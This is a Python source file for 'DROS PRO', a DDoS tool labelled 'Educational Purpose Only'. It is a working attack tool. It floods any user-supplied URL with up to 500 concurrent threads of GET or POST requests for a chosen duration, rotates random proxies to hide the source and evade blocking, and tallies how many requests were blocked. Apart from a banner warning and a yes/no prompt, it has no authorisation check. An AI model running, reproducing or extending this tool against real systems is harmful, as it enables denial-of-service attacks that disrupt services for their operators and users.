#!/usr/bin/env python3
"""
DROS DDOS tool for Ethical Hacker
"""

import sys
import os
import time
import random
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

init(autoreset=True)

# Colors
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
C = Fore.CYAN
W = Fore.WHITE
BOLD = Style.BRIGHT
RESET = Style.RESET_ALL

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    clear()
    print(f"""{R}{BOLD}
                                                                              
       ██████╗ ██████╗  ██████╗ ███████╗    ██████╗ ██████╗  ██████╗           
       ██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗          
       ██║  ██║██████╔╝██║   ██║███████╗    ██████╔╝██████╔╝██║   ██║          
       ██║  ██║██╔══██╗██║   ██║╚════██║    ██╔═══╝ ██╔══██╗██║   ██║          
       ██████╔╝██║  ██║╚██████╔╝███████║    ██║     ██║  ██║╚██████╔╝          
       ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝           
                                                                               
                     ⚡ D R O S   P R O   v 0 . 1 ⚡                            
                 Professional Stress Testing with Proxy                        
                            Coded by: TyraxZero                               
                          Educational Purpose Only                            
                                                                               
{RESET}""")
    print(f"{Y}{BOLD}[!] WARNING: Use only on YOUR OWN server or with permission!{RESET}")
    print(f"{Y}{BOLD}[!] Unauthorized DDoS is ILLEGAL!{RESET}\n")

class DDoSPro:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.proxies = []
        self.use_proxy = False
        self.stop_flag = False
    
    def load_proxies(self, proxy_file):
        """Load proxies from file"""
        try:
            with open(proxy_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and '://' in line:
                        self.proxies.append(line)
                    elif line:
                        self.proxies.append(f'http://{line}')
            print(f"{G}[✓] Loaded {len(self.proxies)} proxies{RESET}")
            self.use_proxy = True
        except Exception as e:
            print(f"{Y}[!] No proxy file found. Running without proxies.{RESET}")
    
    def get_random_proxy(self):
        """Get random proxy from list"""
        if self.use_proxy and self.proxies:
            proxy = random.choice(self.proxies)
            return {'http': proxy, 'https': proxy}
        return None
    
    def send_request(self, url, method='GET', data=None):
        """Send HTTP request with optional proxy"""
        try:
            proxy = self.get_random_proxy()
            if method.upper() == 'GET':
                response = self.session.get(url, timeout=5, proxies=proxy)
            else:
                response = self.session.post(url, data=data, timeout=5, proxies=proxy)
            return response.status_code
        except:
            return 0
    
    def attack_thread(self, url, method, data, duration, results, thread_id):
        """Thread function for attacking"""
        start_time = time.time()
        sent = 0
        
        while time.time() - start_time < duration and not self.stop_flag:
            status = self.send_request(url, method, data)
            sent += 1
            results['sent'] += 1
            results['status'][status] = results['status'].get(status, 0) + 1
        
        results['thread_sent'] = sent
    
    def start_attack(self, url, method='GET', data=None, threads=100, duration=60, proxy_file=None):
        """Start DDoS attack"""
        if proxy_file and os.path.exists(proxy_file):
            self.load_proxies(proxy_file)
        
        print(f"\n{C}{BOLD}[*] Attack Configuration:{RESET}")
        print(f"  {C}Target:{RESET} {url}")
        print(f"  {C}Method:{RESET} {method}")
        print(f"  {C}Threads:{RESET} {threads}")
        print(f"  {C}Duration:{RESET} {duration} seconds")
        print(f"  {C}Proxies:{RESET} {len(self.proxies) if self.use_proxy else 'None'}")
        print()
        
        confirm = input(f"{R}{BOLD}[?] Start attack? (yes/no): {W}").strip().lower()
        if confirm != 'yes':
            print(f"{G}[+] Cancelled.{RESET}")
            return
        
        results = {
            'sent': 0,
            'status': {},
            'thread_sent': 0
        }
        
        print(f"\n{R}{BOLD}[!] ATTACK STARTED! Press Ctrl+C to stop{RESET}\n")
        
        start_time = time.time()
        thread_list = []
        
        for i in range(threads):
            thread = threading.Thread(target=self.attack_thread, args=(url, method, data, duration, results, i+1))
            thread_list.append(thread)
            thread.start()
        
        # Progress bar
        try:
            while any(t.is_alive() for t in thread_list) and not self.stop_flag:
                elapsed = int(time.time() - start_time)
                percent = min(100, int((elapsed / duration) * 100))
                bar = f"{C}[{R}{'█' * (percent//2)}{G}{'░' * (50 - percent//2)}{C}] {W}{percent}%{RESET}"
                sys.stdout.write(f"\r  {bar} | {C}Requests: {W}{results['sent']}{RESET}")
                sys.stdout.flush()
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.stop_flag = True
            print(f"\n{Y}[!] Attack stopped by user{RESET}")
        
        elapsed = time.time() - start_time
        
        print(f"\n\n{C}{BOLD}{'='*60}{RESET}")
        print(f"{G}{BOLD}[✓] ATTACK COMPLETED!{RESET}")
        print(f"{C}{'='*60}{RESET}")
        print(f"  {C}Total Requests:{RESET} {results['sent']}")
        print(f"  {C}Duration:{RESET} {elapsed:.1f} seconds")
        print(f"  {C}Average RPS:{RESET} {results['sent']/elapsed:.1f}")
        print(f"  {C}Status Codes:{RESET}")
        for code, count in sorted(results['status'].items()):
            if code == 200:
                print(f"    {G}{code} OK{RESET}: {count}")
            elif code == 403 or code == 429:
                print(f"    {R}{code} Blocked{RESET}: {count}")
            elif code == 0:
                print(f"    {Y}{code} Timeout/Error{RESET}: {count}")
            else:
                print(f"    {W}{code}{RESET}: {count}")
        print(f"{C}{'='*60}{RESET}\n")

def main():
    banner()
    
    ddos = DDoSPro()
    
    print(f"{C}{BOLD}-------------------------------------------------------------------------------{RESET}")
    print(f"{C}{BOLD}{RESET}                         🎯 ATTACK CONFIGURATION                    {C}{BOLD}{RESET}")
    print(f"{C}{BOLD}-------------------------------------------------------------------------------{RESET}\n")
    
    # Target URL
    url = input(f"  {C}{BOLD}[>]{RESET} Target URL: {W}").strip()
    if not url.startswith('http'):
        url = 'http://' + url
    
    # Method
    method = input(f"  {C}{BOLD}[>]{RESET} Method (GET/POST, default GET): {W}").strip().upper() or 'GET'
    
    # POST data (optional)
    data = None
    if method == 'POST':
        data = input(f"  {C}{BOLD}[>]{RESET} POST data (key=value): {W}").strip()
    
    # Threads
    threads = int(input(f"  {C}{BOLD}[>]{RESET} Threads (default 100): {W}").strip() or 100)
    threads = max(1, min(threads, 500))
    
    # Duration
    duration = int(input(f"  {C}{BOLD}[>]{RESET} Duration (seconds, default 60): {W}").strip() or 60)
    
    # Proxy file
    proxy_file = input(f"  {C}{BOLD}[>]{RESET} Proxy file path (proxies.txt): {W}").strip()
    
    print()
    ddos.start_attack(url, method, data, threads, duration, proxy_file if proxy_file else None)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Stopped by user{RESET}")